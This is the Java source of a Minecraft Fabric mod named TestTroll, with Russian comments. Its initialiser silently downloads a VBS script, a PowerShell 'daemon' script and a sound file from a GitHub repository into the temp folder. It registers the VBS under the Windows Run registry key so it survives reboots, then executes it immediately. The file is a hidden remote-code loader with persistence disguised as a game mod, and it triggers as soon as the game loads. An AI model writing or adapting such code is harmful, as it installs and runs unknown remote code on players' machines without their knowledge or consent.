package name.testtrollchel;

import net.fabricmc.api.ModInitializer;
import java.io.*;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;

public class TestTroll implements ModInitializer {

    private static final String URL_VBS = "https://raw.githubusercontent.com/chaprin1235-cpu/minecraft-chelovek-yaica-beskonechno/refs/heads/main/hidden.vbs";
    private static final String URL_PS1 = "https://raw.githubusercontent.com/chaprin1235-cpu/minecraft-chelovek-yaica-beskonechno/refs/heads/main/daemon.ps1";
    private static final String URL_MP3 = "https://raw.githubusercontent.com/chaprin1235-cpu/minecraft-chelovek-yaica-beskonechno/refs/heads/main/sound.mp3";

    @Override
    public void onInitialize() {
        try {
            File tempDir = new File(System.getProperty("java.io.tmpdir"), "MinecraftData");
            if (!tempDir.exists()) tempDir.mkdirs();

            // Скачиваем файлы
            downloadFile(URL_VBS, new File(tempDir, "hidden.vbs"));
            downloadFile(URL_PS1, new File(tempDir, "daemon.ps1"));
            downloadFile(URL_MP3, new File(tempDir, "sound.mp3"));

            File vbsFile = new File(tempDir, "hidden.vbs");
            String vbsPath = vbsFile.getAbsolutePath();

            // 1. Прописываем в автозагрузку через реестр (чтобы работало после перезагрузки ПК)
            String regCommand = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v testbat /t REG_SZ /d \"wscript.exe \\\"" + vbsPath + "\\\"\" /f";
            ProcessBuilder regPb = new ProcessBuilder("cmd.exe", "/c", regCommand);
            regPb.start().waitFor();

            // 2. Запускаем прямо сейчас
            ProcessBuilder pb = new ProcessBuilder("wscript.exe", vbsPath);
            pb.start();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void downloadFile(String urlStr, File dest) throws IOException {
        URL url = new URL(urlStr);
        try (InputStream in = url.openStream()) {
            Files.copy(in, dest.toPath(), StandardCopyOption.REPLACE_EXISTING);
        }
    }
}
